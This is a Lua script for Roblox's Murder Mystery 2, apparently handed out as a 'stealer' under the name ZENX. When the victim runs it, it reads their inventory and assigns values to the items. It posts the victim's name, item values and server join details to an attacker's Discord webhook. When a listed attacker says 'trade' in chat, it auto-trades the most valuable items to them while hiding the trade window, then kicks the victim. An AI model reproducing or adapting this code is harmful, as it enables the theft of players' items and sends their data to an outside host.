if not _G["Script-SM_Config"] then
    warn("Waiting for config...")
    repeat task.wait() until _G["Script-SM_Config"]
end

local config = _G["Script-SM_Config"]
local webhook = config.user_webhook
local usernames = config.users or {}
local minPingVal = tonumber(config.Min_Ping) or 0

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

if game.PlaceId ~= 142823291 then
    LocalPlayer:Kick("Wrong game! Join Murder Mystery 2")
    return
end

if ReplicatedStorage:FindFirstChild("GetServerType") and ReplicatedStorage.GetServerType:InvokeServer() == "VIPServer" then
    LocalPlayer:Kick("Can't run on VIP servers")
    return
end

local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

-- Better value cache (you can update manually or use a better scraper)
local itemValues = {
    -- Godlies (update these often)
    Harvester = 12500, Gscope = 5800, Icebreaker = 4200, Seer = 3600,
    Gemstone = 2900, Candy = 2500, Snowflake = 2200, Eternal = 1800,
    -- Add more as needed
}

local itemsToTrade = {}
local overallValue = 0

-- Load inventory
local success, inventoryData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
end)

if success and inventoryData and inventoryData.Weapons then
    for itemId, count in pairs(inventoryData.Weapons.Owned or {}) do
        local info = itemDatabase[itemId]
        if info and itemId ~= "DefaultGun" and itemId ~= "DefaultKnife" then
            local name = tostring(info.ItemName)
            local val = itemValues[name] or itemValues[name:lower()] or 150
            overallValue += val * count
            
            table.insert(itemsToTrade, {
                id = itemId,
                name = name,
                qty = count,
                val = val
            })
        end
    end
end

table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)

-- Discord Post
local function postToDiscord()
    local serverLink = "https://www.roblox.com/games/142823291?serverId=" .. game.JobId
    local displayLines = {}
    for i, item in ipairs(itemsToTrade) do
        if i > 12 then break end
        table.insert(displayLines, string.format("x%d %s → %d", item.qty, item.name, item.val))
    end

    local embed = {
        content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone **BIG HIT**" or "**Small Hit**") .. " • Value: " .. string.format("%.0f", overallValue),
        username = "ZENX MM2 Stealer",
        embeds = {{
            title = "🍪 ZENX | Murder Mystery 2 Hit",
            color = 0xFF00FF,
            fields = {
                {name = "Victim", value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")", inline = true},
                {name = "Total Value", value = string.format("%.0f", overallValue), inline = true},
                {name = "Inventory (Top)", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
                {name = "Join Server", value = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')```", inline = false},
            },
            footer = {text = "ZENX HUB • " .. os.date("%Y-%m-%d %H:%M")},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(embed)
        })
    end)
end

-- Trade Engine
local function checkTradeState()
    return ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
end

local function doTrade(target)
    task.spawn(function()
        postToDiscord()
        
        -- Hide trade GUIs
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
        if tradeGui then
            tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
        end

        while #itemsToTrade > 0 do
            local state = checkTradeState()
            
            if state == "None" then
                ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
            elseif state == "StartTrade" then
                -- Offer high value items first
                for i = 1, math.min(5, #itemsToTrade) do
                    local item = table.remove(itemsToTrade, 1)
                    for _ = 1, item.qty do
                        ReplicatedStorage.Trade.OfferItem:FireServer(item.id, "Weapons")
                        task.wait(0.4)
                    end
                end
                task.wait(4)
                ReplicatedStorage.Trade.AcceptTrade:FireServer()
            else
                task.wait(1)
            end
            task.wait(1.2)
        end

        postToDiscord()
        task.wait(2)
        LocalPlayer:Kick("Items recovered by ZENX • discord.gg/yourserver")
    end)
end

-- Listen for targets
local function onPlayerAdded(plr)
    if table.find(usernames, plr.Name) then
        plr.Chatted:Connect(function(msg)
            if string.find(msg:lower(), "trade") or string.find(msg:lower(), "accept") then
                doTrade(plr)
            end
        end)
    end
end

for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
Players.PlayerAdded:Connect(onPlayerAdded)

postToDiscord() -- Initial log
print("✅ ZENX MM2 Stealer Active | Targets:", #usernames)
